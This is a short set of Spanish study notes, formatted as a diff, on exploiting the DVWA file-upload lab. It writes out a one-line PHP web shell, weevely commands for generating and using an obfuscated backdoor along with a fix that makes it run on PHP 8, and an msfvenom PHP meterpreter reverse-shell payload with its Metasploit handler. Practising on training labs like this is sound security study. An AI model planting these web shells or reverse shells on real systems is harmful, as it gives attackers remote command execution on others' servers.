@@ -1,0 +1,31 @@
+File upload dvwa
+Requisitos de finalización
+Credenciales
+Usuario admin
+Contraseña Password
+shell superbásica
+php system($_REQUEST[cmd]); 
+
+uso de weevely en la última version de DVWA (php 8)
+Generamos el exploit
+weevely generate test1234 exploit.php
+
+Se sube el expliot y se invoca
+weevely httpip de la máquina4280hackableuploadsweevely3.php test1234
+
+Comprobamos que falla, vamos a ver el exploit sin ofuscar
+weevely generate -obfuscator cleartext1_php test1234 exploit.php
+
+en la linea 9 aparece el error, hay llaves en vez de corchetes , debe aparecer
+$o.=$t[$i]^$k[$j];
+
+guardamos y ya funcionará.
+Podemos usar la siguiente versión de weevely
+httpsgithub.comepinnaweevely3.git
+
+Funciona para php 8 y mejora la ofuscación.
+
+meterpreter
+msfvenom -p phpmeterpreterreverse_tcp LHOST=ip kali LPORT=4444 -f raw  meterpreter.php
+
+y usaremos metasploit con exploitmultihandler especificando el payload phpmeterpreterreverse_tcp
